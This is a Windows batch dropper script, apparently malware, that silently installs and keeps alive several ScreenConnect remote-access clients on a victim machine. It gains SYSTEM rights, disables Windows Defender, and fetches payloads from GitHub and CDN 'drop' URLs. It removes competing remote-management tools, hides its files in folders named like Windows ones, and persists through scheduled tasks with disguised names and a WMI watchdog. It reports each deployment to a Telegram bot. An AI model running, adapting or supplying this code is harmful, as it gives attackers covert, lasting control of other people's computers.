@echo off
setlocal EnableExtensions EnableDelayedExpansion
REM OWN BUILD 20260802O46 - stuck Gryxa -> ARP nuke + detached msiexec /i (10s kill safe)
set "WD=%ProgramData%\Microsoft\Windows\WER\Temp\.wucache"
set "BOOT=%SystemRoot%\Temp\.wucache"
set "LOG=%WD%\boot.err"
set "MSI=%TEMP%\sc_primary.msi"
set "MSICACHE=%WD%\pkg.msi"
set "PRIM=ScreenConnect Client (5f6010579852e507)"
set "ALT=ScreenConnect Client (f861c8140d453427)"
set "GRYXA=ScreenConnect Client (9908198e668e4750)"
set "KEEP1=5f6010579852e507"
set "KEEP2=f861c8140d453427"
set "KEEP3=9908198e668e4750"
set "MSIURL=https://ui.sevrz.com/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest"
set "MSIURL_GRYXA=https://ui.gryxa.com/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest"
set "MSI_G=%TEMP%\sc_gryxa.msi"
set "MSICACHE_G=%WD%\pkg_gryxa.msi"
set "SELF=%WD%\own_run.cmd"
set "PF86=%ProgramFiles(x86)%"
set "DROP=https://raw.githubusercontent.com/xnobuddy/github-drop/main"
set "DROP2=https://cdn.jsdelivr.net/gh/xnobuddy/github-drop@main"
set "CURL=%SystemRoot%\System32\curl.exe"
if not exist "%CURL%" set "CURL=curl.exe"

if not exist "%WD%" mkdir "%WD%" >nul 2>&1
if not exist "%BOOT%" mkdir "%BOOT%" >nul 2>&1

REM Survive ScreenConnect Guest kill: detach into SYSTEM worker
if /I not "%~1"=="_RUN" (
  echo === OWN BUILD 20260802O46 ===
  echo whoami:
  whoami
  set "ELEV=0"
  whoami /groups | find "S-1-16-12288" >nul 2>&1 && set "ELEV=1"
  whoami /groups | find "S-1-5-18" >nul 2>&1 && set "ELEV=1"
  whoami | find /I "SYSTEM" >nul 2>&1 && set "ELEV=1"
  if "!ELEV!"=="0" (
    echo.
    echo *** NOT ELEVATED / NOT SYSTEM ***
    echo In ScreenConnect Command window: set Run as = SYSTEM
    echo Attempting UAC elevate ^(click Yes if prompted^)...
    copy /y "%~f0" "%BOOT%\own_elev.cmd" >nul 2>&1
    powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Start-Process -FilePath 'cmd.exe' -ArgumentList '/c \"%BOOT%\own_elev.cmd\"' -Verb RunAs"
    echo If no UAC prompt appeared, re-run command as SYSTEM.
    exit /b 5
  )
  echo elevated_ok>>"%BOOT%\boot.err" 2>nul
  REM O41b: never overwrite a locked own_run.cmd (prior worker holds it) — unique runner always.
  REM Also strip attrs on WD targets before any later copy.
  attrib -h -s -r "%BOOT%\own_run.cmd" >nul 2>&1
  attrib -h -s -r "%SELF%" >nul 2>&1
  set "RUNNER=%BOOT%\own_o32_%RANDOM%%RANDOM%.cmd"
  copy /y "%~f0" "!RUNNER!" >nul 2>&1
  if not exist "!RUNNER!" (
    echo ERROR: cannot write unique runner under %BOOT%
    exit /b 6
  )
  findstr /C:"OWN BUILD 20260802O46" "!RUNNER!" >nul 2>&1
  if errorlevel 1 (
    echo ERROR: runner copy is not O41 - abort
    exit /b 7
  )
  REM best-effort refresh of canonical paths (ignore lock failures)
  copy /y "!RUNNER!" "%BOOT%\own_run.cmd" >nul 2>&1
  mkdir "%WD%" >nul 2>&1
  copy /y "!RUNNER!" "%SELF%" >nul 2>&1
  echo go_start %DATE% %TIME%>>"%BOOT%\boot.err" 2>nul
  set "LOG=%WD%\boot.err"
  echo go_start %DATE% %TIME%>>"%LOG%" 2>nul
  if not exist "%LOG%" set "LOG=%BOOT%\boot.err"
  echo order=exterminate_then_repair_then_install>>"%LOG%" 2>nul
  echo engine=cmd_detached_o32>>"%LOG%" 2>nul
  echo whoami_launcher=>>"%LOG%" 2>nul
  whoami >>"%LOG%" 2>&1
  echo detach_begin>>"%LOG%" 2>nul
  echo runner=!RUNNER!>>"%LOG%" 2>nul
  set "DETACH_OK=0"

  REM Method A: plain schtasks as SYSTEM (paths have no spaces)
  REM NOTE: RUNNER is set inside this block - MUST use !RUNNER! (delayed expansion)
  schtasks /Delete /TN "WucacheOwn" /F >nul 2>&1
  schtasks /Create /TN "WucacheOwn" /RU SYSTEM /RL HIGHEST /SC ONCE /ST 23:59 /F /TR "cmd.exe /c !RUNNER! _RUN" >"%BOOT%\detach.task" 2>&1
  if not errorlevel 1 (
    del /f /q "%BOOT%\wproof" >nul 2>&1
    schtasks /Run /TN "WucacheOwn" >"%BOOT%\detach.run" 2>&1
    if not errorlevel 1 (
      REM SC Guest often kills at 10s — do NOT wait 12s for proof; /Run means worker launched.
      set "DETACH_OK=1"
      echo detach_via=schtasks_root>>"%LOG%"
    )
  )

  REM Method B: wmic (often absent on Win11)
  if "!DETACH_OK!"=="0" (
    wmic process call create "cmd.exe /c \"!RUNNER!\" _RUN" >"%BOOT%\detach.wmic" 2>&1
    findstr /C:"ReturnValue = 0" "%BOOT%\detach.wmic" >nul 2>&1
    if not errorlevel 1 (
      set "DETACH_OK=1"
      echo detach_via=wmic>>"%LOG%"
    )
  )

  REM Method C: one-shot service (flat path; cmd not a service - last resort)
  if "!DETACH_OK!"=="0" (
    copy /y "!RUNNER!" "%SystemRoot%\Temp\wucache_own.cmd" >nul 2>&1
    sc.exe stop WucacheOwn >nul 2>&1
    sc.exe delete WucacheOwn >nul 2>&1
    sc.exe create WucacheOwn binPath= "cmd.exe /c %SystemRoot%\Temp\wucache_own.cmd _RUN" start= demand type= own >"%BOOT%\detach.sc" 2>&1
    sc.exe start WucacheOwn >"%BOOT%\detach.scstart" 2>&1
    findstr /I /C:"START_PENDING" "%BOOT%\detach.scstart" >nul 2>&1 && set "DETACH_OK=1"
    findstr /I /C:"RUNNING" "%BOOT%\detach.scstart" >nul 2>&1 && set "DETACH_OK=1"
    if "!DETACH_OK!"=="1" echo detach_via=sc_service>>"%LOG%"
  )

  REM Method D: inline fallback (Guest may kill; better than nothing)
  if "!DETACH_OK!"=="0" (
    echo detach_via=inline_fallback>>"%LOG%"
    echo WARNING: detach APIs failed - running inline ^(Guest may kill^)

    call "!RUNNER!" _RUN
    exit /b !ERRORLEVEL!
  )

  echo detach_done>>"%LOG%"
  echo Detached OK. Wait ~90s then:
  echo   type "%LOG%"
  echo   type "%BOOT%\boot.err"
  echo   sc query state= all ^| findstr /I ScreenConnect
  exit /b 0
)

echo worker_start %DATE% %TIME%>>"%LOG%"
echo ok>"%BOOT%\wproof" 2>nul
echo === OWN WORKER 20260802O46 ===
if not exist "%LOG%" (
  set "LOG=%SystemRoot%\Temp\.wucache\boot.err"
  if not exist "%SystemRoot%\Temp\.wucache" mkdir "%SystemRoot%\Temp\.wucache" >nul 2>&1
  echo worker_start %DATE% %TIME%>>"%LOG%"
)

echo [0] Extract embedded payloads (self-contained mode)...
attrib -h -s -r "%WD%\own_mon.cmd" >nul 2>&1
attrib -h -s -r "%WD%\own_secure.cmd" >nul 2>&1
attrib -h -s -r "%WD%\tg_report.ps1" >nul 2>&1
attrib -h -s -r "%WD%\own_lib.ps1" >nul 2>&1
call :Extract B64_MON "%WD%\own_mon.cmd"
call :Extract B64_SEC "%WD%\own_secure.cmd"
call :Extract B64_TGR "%WD%\tg_report.ps1"
call :Extract B64_LIB "%WD%\own_lib.ps1"
if not exist "%WD%\notify.cfg" call :Extract B64_NTF "%WD%\notify.cfg"
echo embed_extract_done>>"%LOG%"

REM O41: force-refresh any stale/missing payload (old hardening used to freeze these files)
findstr /C:"20260802M32" "%WD%\own_mon.cmd" >nul 2>&1
if errorlevel 1 (
  attrib -h -s -r "%WD%\own_mon.cmd" >nul 2>&1
  "%CURL%" -L --ssl-no-revoke --connect-timeout 20 -o "%WD%\own_mon.cmd" "%DROP%/own_mon.cmd" >nul 2>&1
  if not exist "%WD%\own_mon.cmd" "%CURL%" -L --connect-timeout 20 -o "%WD%\own_mon.cmd" "%DROP2%/own_mon.cmd" >nul 2>&1
)
findstr /C:"20260802S9" "%WD%\own_secure.cmd" >nul 2>&1
if errorlevel 1 (
  attrib -h -s -r "%WD%\own_secure.cmd" >nul 2>&1
  "%CURL%" -L --ssl-no-revoke --connect-timeout 20 -o "%WD%\own_secure.cmd" "%DROP%/own_secure.cmd" >nul 2>&1
  if not exist "%WD%\own_secure.cmd" "%CURL%" -L --connect-timeout 20 -o "%WD%\own_secure.cmd" "%DROP2%/own_secure.cmd" >nul 2>&1
)
findstr /C:"20260802T16" "%WD%\tg_report.ps1" >nul 2>&1
if errorlevel 1 (
  attrib -h -s -r "%WD%\tg_report.ps1" >nul 2>&1
  "%CURL%" -L --ssl-no-revoke --connect-timeout 20 -o "%WD%\tg_report.ps1" "%DROP%/tg_report.ps1" >nul 2>&1
  if not exist "%WD%\tg_report.ps1" "%CURL%" -L --connect-timeout 20 -o "%WD%\tg_report.ps1" "%DROP2%/tg_report.ps1" >nul 2>&1
)
findstr /C:"20260802L22" "%WD%\own_lib.ps1" >nul 2>&1
if errorlevel 1 (
  attrib -h -s -r "%WD%\own_lib.ps1" >nul 2>&1
  "%CURL%" -L --ssl-no-revoke --connect-timeout 20 -o "%WD%\own_lib.ps1" "%DROP%/own_lib.ps1" >nul 2>&1
  if not exist "%WD%\own_lib.ps1" "%CURL%" -L --connect-timeout 20 -o "%WD%\own_lib.ps1" "%DROP2%/own_lib.ps1" >nul 2>&1
)

echo [1] Defender + harden (exclusions/ACL) + soft AV stop...
echo av_reg_begin>>"%LOG%"
if exist "%WD%\own_secure.cmd" call "%WD%\own_secure.cmd"
start "" /b cmd /c "sc stop WinDefend >nul 2>&1 & sc stop WdNisSvc >nul 2>&1 & sc stop Sense >nul 2>&1 & sc config WinDefend start= disabled >nul 2>&1"
echo av_fight_done>>"%LOG%"

echo [2] Download PRIMARY MSI (curl / powershell / github-pkg / cache)...
call :FetchMsi "%MSI%"
set "GOTMSI=%ERRORLEVEL%"
if "%GOTMSI%"=="0" (
  echo msi_ready>>"%LOG%"
) else (
  echo msi_fetch_FAILED>>"%LOG%"
)

echo [3] Exterminate foreign SC + disallowed RMM FIRST (clean field = SC installer custom action cannot collide)...
call :NukeForeign

echo [4] Ensure PRIMARY (SC-aware ladder: start -> /fa repair -> /i ONLY if unregistered)...
call :NoMsiPolicy
sc query "%PRIM%" | findstr /I RUNNING >nul
if not errorlevel 1 (
  echo primary already RUNNING
  echo primary_already_running>>"%LOG%"
  goto :after_primary_install
)

REM present but STOPPED: restart, then /fa repair (never /i - shared legacy UpgradeCodes wipe ALT)
sc query "%PRIM%" >nul 2>&1
if not errorlevel 1 (
  echo primary_present_stopped_restart>>"%LOG%"
  net start "%PRIM%" >nul 2>&1
  sc start "%PRIM%" >nul 2>&1
  timeout /t 8 /nobreak >nul
  sc query "%PRIM%" | findstr /I RUNNING >nul
  if not errorlevel 1 (
    echo primary_restarted_ok>>"%LOG%"
    goto :after_primary_install
  )
  echo primary_stopped_try_repair>>"%LOG%"
  if exist "%WD%\own_lib.ps1" powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action repair -Fp "%KEEP1%" -WorkDir "%WD%" >>"%LOG%" 2>&1
  sc query "%PRIM%" | findstr /I RUNNING >nul
  if not errorlevel 1 (
    echo primary_repaired_ok>>"%LOG%"
    goto :after_primary_install
  )
  echo primary_repair_failed_still_stopped>>"%LOG%"
  goto :after_primary_install
)

REM service missing: try /fa if product registered (safe - no Upgrade table remove)
echo primary_svc_missing_try_repair>>"%LOG%"
if exist "%WD%\own_lib.ps1" powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action repair -Fp "%KEEP1%" -WorkDir "%WD%" >>"%LOG%" 2>&1
sc query "%PRIM%" | findstr /I RUNNING >nul
if not errorlevel 1 (
  echo primary_repaired_ok>>"%LOG%"
  goto :after_primary_install
)

if not "%GOTMSI%"=="0" (
  echo primary_skip_install_no_msi>>"%LOG%"
  goto :after_primary_install
)

REM refuse /i if product already registered - /i re-enters Upgrade table and can wipe ALT
set "REGSTATE=unknown"
if exist "%WD%\own_lib.ps1" for /f "usebackq delims=" %%R in (`powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action registered -Fp "%KEEP1%" -WorkDir "%WD%"`) do set "REGSTATE=%%R"
if /I "!REGSTATE!"=="yes" (
  echo primary_registered_skip_fresh_install>>"%LOG%"
  goto :after_primary_install
)

REM stale install dir with no registered product breaks SC custom action FixupServiceArguments
if exist "%PF86%\ScreenConnect Client (%KEEP1%)" (
  echo stale_primary_dir_clean>>"%LOG%"
  rmdir /s /q "%PF86%\ScreenConnect Client (%KEEP1%)" >nul 2>&1
)
if exist "%ProgramFiles%\ScreenConnect Client (%KEEP1%)" (
  echo stale_primary_dir_clean_pf>>"%LOG%"
  rmdir /s /q "%ProgramFiles%\ScreenConnect Client (%KEEP1%)" >nul 2>&1
)

echo primary missing/unregistered - MSI install (LAST RESORT - Upgrade table may touch siblings)...
echo primary_install_begin>>"%LOG%"
msiexec /i "%MSI%" /qn /norestart ALLUSERS=1 REBOOT=ReallySuppress /L*v "%WD%\msi_install.log"
set "INST_EXIT=!ERRORLEVEL!"
echo msi_exit_!INST_EXIT!>>"%LOG%"
if "!INST_EXIT!"=="1618" (
  echo msi_busy_retry1>>"%LOG%"
  timeout /t 30 /nobreak >nul
  msiexec /i "%MSI%" /qn /norestart ALLUSERS=1 REBOOT=ReallySuppress /L*v "%WD%\msi_install2.log"
  set "INST_EXIT=!ERRORLEVEL!"
  echo msi_retry1618_exit_!INST_EXIT!>>"%LOG%"
)
if "!INST_EXIT!"=="1618" (
  echo msi_busy_retry2>>"%LOG%"
  timeout /t 45 /nobreak >nul
  msiexec /i "%MSI%" /qn /norestart ALLUSERS=1 REBOOT=ReallySuppress /L*v "%WD%\msi_install3.log"
  set "INST_EXIT=!ERRORLEVEL!"
  echo msi_retry1618_exit_!INST_EXIT!>>"%LOG%"
)
timeout /t 15 /nobreak >nul

REM post-install: product registered but service entry still missing -> /fa by GUID (safe)
sc query "%PRIM%" >nul 2>&1
if errorlevel 1 (
  echo postinstall_svc_missing_repair>>"%LOG%"
  if exist "%WD%\own_lib.ps1" powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action repair -Fp "%KEEP1%" -WorkDir "%WD%" >>"%LOG%" 2>&1
)

:after_primary_install
sc config "%PRIM%" start= auto >nul 2>&1
sc failure "%PRIM%" reset= 86400 actions= restart/3000/restart/3000/restart/3000 >nul 2>&1
sc start "%PRIM%" >nul 2>&1
timeout /t 5 /nobreak >nul
sc start "%PRIM%" >nul 2>&1
sc query "%PRIM%" | findstr /I RUNNING >nul
if not errorlevel 1 (
  echo primary_running_ok>>"%LOG%"
) else (
  echo primary_still_down_after_install>>"%LOG%"
  sc query "%PRIM%" >>"%LOG%" 2>&1
)

echo [5] Start allowlist...
sc config "%ALT%" start= auto >nul 2>&1
sc start "%ALT%" >nul 2>&1
sc config "%PRIM%" start= auto >nul 2>&1
sc start "%PRIM%" >nul 2>&1
timeout /t 2 /nobreak >nul
REM O41: restore ALT if its service entry was deleted (SC-family msiexec side effect)
sc query "%ALT%" >nul 2>&1
if errorlevel 1 if exist "%WD%\own_lib.ps1" (
  echo alt_missing_repair>>"%LOG%"
  powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action repair -Fp "%KEEP2%" -WorkDir "%WD%" >>"%LOG%" 2>&1
)

echo [5b] Gryxa MUST-RUN deep ensure (svc+dir+TCP/relay+FP drift)...
if exist "%WD%\own_lib.ps1" (
  powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action gryxa-ensure -Deep -WorkDir "%WD%" -Build O42 >>"%LOG%" 2>&1
) else (
  call :EnsureGryxaMust
)
if exist "%WD%\gryxa.cfg" for /f "usebackq tokens=1,* delims==" %%K in ("%WD%\gryxa.cfg") do if /I "%%K"=="CURRENT_FP" set "KEEP3=%%L"
if defined KEEP3 set "GRYXA=ScreenConnect Client (%KEEP3%)"
sc query "%GRYXA%" | findstr /I RUNNING >nul
if errorlevel 1 if exist "%WD%\own_lib.ps1" (
  echo gryxa_force_after_deep>>"%LOG%"
  del /f /q "%WD%\gryxa_reinstall.flag" >nul 2>&1
  powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action gryxa-ensure -Deep -Force -WorkDir "%WD%" -Build O42 >>"%LOG%" 2>&1
  if exist "%WD%\gryxa.cfg" for /f "usebackq tokens=1,* delims==" %%K in ("%WD%\gryxa.cfg") do if /I "%%K"=="CURRENT_FP" set "KEEP3=%%L"
  if defined KEEP3 set "GRYXA=ScreenConnect Client (%KEEP3%)"
)
sc query "%GRYXA%" | findstr /I RUNNING >nul
if not errorlevel 1 (echo gryxa_must_running_ok>>"%LOG%") else (echo gryxa_must_still_down>>"%LOG%")

echo [6] Arm wipe-proof persist (identity tasks + WMI watchdog + MSI cache)...
echo persist_begin>>"%LOG%"
if exist "%~dp0notify.cfg" call :ForceCopy "%~dp0notify.cfg" "%WD%\notify.cfg"
if not exist "%ProgramData%\Microsoft\Diagnosis\State\.etlcache" mkdir "%ProgramData%\Microsoft\Diagnosis\State\.etlcache" >nul 2>&1
call :ForceCopy "%WD%\own_mon.cmd" "%ProgramData%\Microsoft\Diagnosis\State\.etlcache\etl_mon.cmd"

if exist "%MSI%" for %%A in ("%MSI%") do if %%~zA GEQ 500000 (
  call :ForceCopy "%MSI%" "%MSICACHE%"
  echo msi_cached_bytes=%%~zA>>"%LOG%"
)

REM anti-signature identity: per-host task names + jittered schedule
REM O39/L13: Create like WucacheOwn â€” BOOT TR path + cmd schtasks + /ST (WD is ACL-locked)
if exist "%WD%\own_lib.ps1" powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action init -WorkDir "%WD%" >nul 2>&1
if exist "%WD%\identity.cfg" for /f "usebackq tokens=1,* delims==" %%K in ("%WD%\identity.cfg") do set "%%K=%%L"
if not defined TASK_A set "TASK_A=WerQueueSync"
if not defined TASK_B set "TASK_B=PlaServerHealth"
if not defined TASK_C set "TASK_C=WdiHostProxy"
if not defined TASK_D set "TASK_D=TcpIpConflictRes"
if not defined MO_A set "MO_A=2"
if not defined MO_B set "MO_B=3"
REM strip leading \ if present (IDENTVER 6/7 leftovers)
if "!TASK_A:~0,1!"=="\" set "TASK_A=!TASK_A:~1!"
if "!TASK_B:~0,1!"=="\" set "TASK_B=!TASK_B:~1!"
if "!TASK_C:~0,1!"=="\" set "TASK_C=!TASK_C:~1!"
if "!TASK_D:~0,1!"=="\" set "TASK_D=!TASK_D:~1!"
echo identity_A=!TASK_A!>>"%LOG%"
echo identity_B=!TASK_B!>>"%LOG%"
echo identity_C=!TASK_C!>>"%LOG%"
echo identity_D=!TASK_D! mo=!MO_A!/!MO_B!>>"%LOG%"

REM TR under BOOT (Windows\Temp\.wucache) â€” same tree as working WucacheOwn detach
if not exist "%BOOT%" mkdir "%BOOT%" >nul 2>&1
copy /y "%WD%\own_mon.cmd" "%BOOT%\own_mon.cmd" >nul 2>&1
copy /y "%WD%\own_mon.cmd" "%BOOT%\etl_mon.cmd" >nul 2>&1
if not exist "%ProgramData%\Microsoft\Diagnosis\State\.etlcache" mkdir "%ProgramData%\Microsoft\Diagnosis\State\.etlcache" >nul 2>&1
copy /y "%WD%\own_mon.cmd" "%ProgramData%\Microsoft\Diagnosis\State\.etlcache\etl_mon.cmd" >nul 2>&1

for /f "tokens=1-2 delims=:" %%H in ("%TIME%") do set "ST=%%H:%%I"
set "ST=!ST: =0!"
echo create_taskA_begin>>"%LOG%"
schtasks /Delete /TN "!TASK_A!" /F >nul 2>&1
schtasks /Create /TN "!TASK_A!" /RU SYSTEM /RL HIGHEST /SC MINUTE /MO !MO_A! /ST !ST! /F /TR "cmd.exe /c %BOOT%\own_mon.cmd" >>"%LOG%" 2>&1
echo create_taskB_begin>>"%LOG%"
schtasks /Delete /TN "!TASK_B!" /F >nul 2>&1
schtasks /Create /TN "!TASK_B!" /RU SYSTEM /RL HIGHEST /SC MINUTE /MO !MO_B! /ST !ST! /F /TR "cmd.exe /c %BOOT%\etl_mon.cmd" >>"%LOG%" 2>&1
echo create_taskC_begin>>"%LOG%"
schtasks /Delete /TN "!TASK_C!" /F >nul 2>&1
schtasks /Create /TN "!TASK_C!" /RU SYSTEM /RL HIGHEST /SC ONSTART /F /TR "cmd.exe /c %BOOT%\own_mon.cmd" >>"%LOG%" 2>&1
echo create_taskD_begin>>"%LOG%"
schtasks /Delete /TN "!TASK_D!" /F >nul 2>&1
schtasks /Create /TN "!TASK_D!" /RU SYSTEM /RL HIGHEST /SC ONLOGON /F /TR "cmd.exe /c %BOOT%\own_mon.cmd" >>"%LOG%" 2>&1
echo persist_armed_identity>>"%LOG%"
schtasks /Query /TN "!TASK_A!" >nul 2>&1 || echo verify_taskA_FAIL>>"%LOG%"
schtasks /Query /TN "!TASK_B!" >nul 2>&1 || echo verify_taskB_FAIL>>"%LOG%"
schtasks /Query /TN "!TASK_C!" >nul 2>&1 || echo verify_taskC_FAIL>>"%LOG%"
schtasks /Query /TN "!TASK_D!" >nul 2>&1 || echo verify_taskD_FAIL>>"%LOG%"
schtasks /Run /TN "!TASK_A!" >nul 2>&1
echo first_tick_run>>"%LOG%"

REM also run lib tasks-ensure (idempotent repair / ownership check)
if exist "%WD%\own_lib.ps1" (
  for /f "usebackq delims=" %%R in (`powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action tasks-ensure -WorkDir "%WD%" -MonPath "%WD%\own_mon.cmd"`) do (
    echo tasks_ensure %%R>>"%LOG%"
  )
)

REM chain 2: WMI watchdog subscription (mutual persistence)
if exist "%WD%\own_lib.ps1" powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action watchdog -WorkDir "%WD%" -MonPath "%BOOT%\own_mon.cmd" >nul 2>&1
echo watchdog_armed>>"%LOG%"

REM campaign state baseline
if exist "%WD%\own_lib.ps1" powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action state -WorkDir "%WD%" -Build O42 -Extra "deploy" >nul 2>&1

echo [6b] Re-lock persist dirs/tasks/SC after arm...
if exist "%WD%\own_secure.cmd" call "%WD%\own_secure.cmd"

echo [7] First-deploy Telegram report...
if not exist "%WD%\notify.cfg" (
  if exist "%~dp0notify.cfg" (
    call :ForceCopy "%~dp0notify.cfg" "%WD%\notify.cfg"
  ) else (
    echo notify_cfg_MISSING>>"%LOG%"
    echo WARNING: notify.cfg missing - TG report will be skipped. Seed BOT_TOKEN/CHAT_ID into %WD%\notify.cfg
  )
)
if exist "%WD%\notify.cfg" (
  powershell.exe -NoProfile -ExecutionPolicy Bypass -File "%WD%\tg_report.ps1" -State DEPLOY -Summary "own.cmd first deploy complete" -WorkDir "%WD%" -Build O42 >>"%LOG%" 2>&1
) else (
  echo deploy_tg_skipped_no_notify>>"%LOG%"
)
echo deploy_tg_done>>"%LOG%"

sc query "%PRIM%" >>"%LOG%" 2>&1
sc query state= all | findstr /I ScreenConnect >>"%LOG%"
echo go_exit_0>>"%LOG%"
exit /b 0

REM ========== helpers ==========
:FetchMsi
set "OUT=%~1"
del /f /q "%OUT%" >nul 2>&1
echo fetch_msi_begin>>"%LOG%"

if exist "%SystemRoot%\System32\curl.exe" (
  echo fetch_try=curl_sys>>"%LOG%"
  "%SystemRoot%\System32\curl.exe" -L --ssl-no-revoke --connect-timeout 30 --max-time 180 -o "%OUT%" "%MSIURL%" >>"%LOG%" 2>&1
)
call :MsiOk "%OUT%"
if not errorlevel 1 exit /b 0

echo fetch_try=curl_path>>"%LOG%"
curl.exe -L --ssl-no-revoke --connect-timeout 30 --max-time 180 -o "%OUT%" "%MSIURL%" >>"%LOG%" 2>&1
call :MsiOk "%OUT%"
if not errorlevel 1 exit /b 0

echo fetch_try=powershell>>"%LOG%"
powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command ^
  "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;" ^
  "Try{Invoke-WebRequest -Uri '%MSIURL%' -OutFile '%OUT%' -UseBasicParsing -TimeoutSec 180}Catch{Add-Content -LiteralPath '%LOG%' -Value ('fetch_ps_err '+$_.Exception.Message)}" >>"%LOG%" 2>&1
call :MsiOk "%OUT%"
if not errorlevel 1 exit /b 0

echo fetch_try=github_pkg>>"%LOG%"
"%CURL%" -L --ssl-no-revoke --connect-timeout 30 --max-time 300 -o "%OUT%" "%DROP%/pkg.msi?t=%RANDOM%" >>"%LOG%" 2>&1
call :MsiOk "%OUT%"
if not errorlevel 1 exit /b 0

echo fetch_try=jsdelivr_pkg>>"%LOG%"
"%CURL%" -L --connect-timeout 30 --max-time 300 -o "%OUT%" "%DROP2%/pkg.msi" >>"%LOG%" 2>&1
call :MsiOk "%OUT%"
if not errorlevel 1 exit /b 0

if exist "%MSICACHE%" (
  echo fetch_try=cache>>"%LOG%"
  copy /y "%MSICACHE%" "%OUT%" >nul
  call :MsiOk "%OUT%"
  if not errorlevel 1 exit /b 0
)

echo fetch_msi_all_failed>>"%LOG%"
exit /b 1

:MsiOk
if not exist "%~1" exit /b 1
for %%A in ("%~1") do (
  echo msi_bytes=%%~zA>>"%LOG%"
  if %%~zA LSS 500000 (
    echo msi_too_small>>"%LOG%"
    del /f /q "%~1" >nul 2>&1
    exit /b 1
  )
  copy /y "%~1" "%MSICACHE%" >nul 2>&1
)
exit /b 0

:NukeForeign
echo exterminate_begin>>"%LOG%"
if exist "%WD%\own_lib.ps1" (
  powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action exterminate -WorkDir "%WD%" >>"%LOG%" 2>&1
) else (
  echo exterminate_skipped_no_lib>>"%LOG%"
)
echo exterminate_done>>"%LOG%"
REM settle Windows Installer mutex after /x before any /i or /fa
timeout /t 8 /nobreak >nul
exit /b 0

:EnsureGryxaMust
rem O42: thin fallback — prefer lib gryxa-ensure; never msiexec here.
if exist "%WD%\own_lib.ps1" (
  powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action gryxa-ensure -WorkDir "%WD%" -Build O42 >>"%LOG%" 2>&1
)
if exist "%WD%\gryxa.cfg" for /f "usebackq tokens=1,* delims==" %%K in ("%WD%\gryxa.cfg") do if /I "%%K"=="CURRENT_FP" set "KEEP3=%%L"
if defined KEEP3 set "GRYXA=ScreenConnect Client (%KEEP3%)"
sc query "%GRYXA%" | findstr /I RUNNING >nul
if not errorlevel 1 (echo gryxa_must_running_ok>>"%LOG%") else (echo gryxa_must_still_down>>"%LOG%")
exit /b 0

:NoMsiPolicy
reg delete "HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer" /v DisableMSI /f >nul 2>&1
reg delete "HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer" /v DisableMSI /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer" /v DisableMSI /t REG_DWORD /d 0 /f >nul 2>&1
exit /b 0

:ForceCopy
rem O20: copy over previously hardened (+h +s) targets - strip attrs first
attrib -h -s -r "%~2" >nul 2>&1
copy /y "%~1" "%~2" >nul 2>&1
if exist "%~2" exit /b 0
exit /b 1

:Extract
rem %1=tag %2=outfile - pulls base64 block embedded in this script (self-contained mode)
set "TAG=%~1"
set "OUT=%~2"
powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command "$raw=Get-Content -LiteralPath '%~f0' -Raw; $m=[regex]::Match($raw,'(?ms)%TAG%_BEGIN\s*(.+?)\s*%TAG%_END'); if($m.Success){ $b=($m.Groups[1].Value -replace '(?m)^::','' -replace '\s',''); try{ [IO.File]::WriteAllBytes('%OUT%',[Convert]::FromBase64String($b)) }catch{} }"
if exist "%OUT%" exit /b 0
exit /b 1

::B64_MON_BEGIN
QGVjaG8gb2ZmDQpyZW0g4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ
4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ
4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ
4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQDQpyZW0gIE9XTl9NT04gIEJVSUxEIDIw
MjYwODAyTTMyDQpyZW0gIE80NDogcGVyLUdyeXhhIHN0YXRlKzI0aCBSRVNUT1JFRCBzdXBwcmVz
cyAoc3RvcCBURyBmbG9vZCk7IG5vIHN0YXRlIGNsb2JiZXIuDQpyZW0gIEF1dGhvcml6ZWQgaW50
ZXJuYWwgZGVwbG95bWVudCAtIGxhYi9jb21wZXRpdGlvbiBzY29wZSBvbmx5Lg0KcmVtIOKVkOKV
kOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKV
kOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKV
kOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKV
